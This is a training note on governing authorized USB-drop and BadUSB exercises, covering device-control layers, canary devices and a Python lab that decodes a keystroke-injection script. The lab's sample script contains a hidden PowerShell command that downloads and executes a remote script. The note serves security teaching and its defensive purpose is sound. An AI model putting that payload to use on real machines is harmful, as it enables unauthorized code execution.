---
title: "Removable Media & BadUSB Exercise Governance"
tags: [tree/offensive, cyber/offensive/social/removable-media]
Domain: "[[Physical Social Engineering]]"
Color: "#DC143C"
---

# Removable Media & BadUSB Exercise Governance

Removable-media exercises measure device control, autorun/execution prevention, endpoint telemetry, user reporting, and response using inert signed canaries.

```mermaid
flowchart LR
    D["Inventory-tagged device"] --> H["Host control"]
    H --> C["Canary action"]
    C --> T["Telemetry/response"]
    T --> R["Device recovery"]
```

Never deploy destructive keystrokes or uncontrolled payloads. Define serials, placement, collection, expiry, behavior, target cohort, and lost-device procedure. Mastery lab: compare blocked storage, allowed storage, and HID canary behavior in an isolated endpoint range.

## Parent Learning Order
Tailgating, Facility & Visitor Process Testing -> Removable Media & BadUSB Exercise Governance

## Device classes and controls

USB storage, human-interface devices, network adapters, serial devices, and composite devices present different trust decisions. Blocking mass storage does not prove that a keyboard-emulating device or USB Ethernet adapter is controlled. Assess device-control policy, port restrictions, endpoint telemetry, driver installation, application control, user reporting, and physical asset handling as separate layers.

```text
Asset: C2R-USB-017
Class: signed read-only storage canary
Placement: approved training room
Behavior: opens static instructions only; no auto-execution
Expiry: 18:00 UTC
Recovery owner: Physical Security
```

For HID simulation, use an isolated test endpoint and an inert action such as typing a unique marker into a local text editor. Never launch a shell, alter security controls, or rely on uncontrolled timing. Photograph placement only where privacy rules permit, track every serial, and treat an unrecovered device as an incident. Evaluate whether controls block the class, whether telemetry identifies insertion and process lineage, and whether staff report unknown media without plugging it in.

## Runnable Lab (one machine, Python)

A BadUSB device is not "a file on a stick" — it registers as a **keyboard** and types commands faster than a human, so no autorun or file execution is needed. This lab decodes a Rubber-Ducky-style script so you can see exactly what keystrokes a dropped device would inject.

**Step 1 — the HID decoder (`ducky.py`).**

```python
ducky="""DELAY 500
GUI r
DELAY 300
STRING powershell -w hidden -c "iwr http://10.0.0.5/a.ps1|iex"
ENTER"""
for line in ducky.splitlines():
    if line.startswith("STRING"): print(f"  type -> {line[7:]}")
    elif line.startswith("DELAY"): print(f"  wait {line.split()[1]}ms")
    else: print(f"  key  -> {line}")
```

**Step 2 — run it.**

```console
$ python3 ducky.py
Decoded HID injection sequence:
  wait 500ms
  key  -> GUI r
  wait 300ms
  type -> powershell -w hidden -c "iwr http://10.0.0.5/a.ps1|iex"
  key  -> ENTER
Verdict: opens Run dialog, fetches+executes remote PowerShell -> code exec on insert
```

**Step 3 — the deliberate insight.** USB *storage* blocking does nothing here — the device is a **keyboard**. The control that matters is HID allow-listing / device-control policy, not disabling mass storage.

**Step 4 — cleanup:** static parsing of a script string — no cleanup required.

**What you should now be able to do:** explain why BadUSB bypasses autorun and storage controls, decode a ducky payload, and name the device-control policy that actually mitigates it. Governance note: real drops use inventory-tagged devices and a canary beacon, never live malware.

## Crook → Operator → Root Checkpoint

- **Crook:** Why does a BadUSB stick work even with autorun disabled?
- **Operator:** You run an authorized drop test. What does a tagged device "call home" with, and what must it never do?
- **Root:** Explain HID-level device control and its limits (a device that enumerates as both keyboard and storage), and how endpoint telemetry detects injection.

---
> 🔼 Up: [[Physical Social Engineering]]
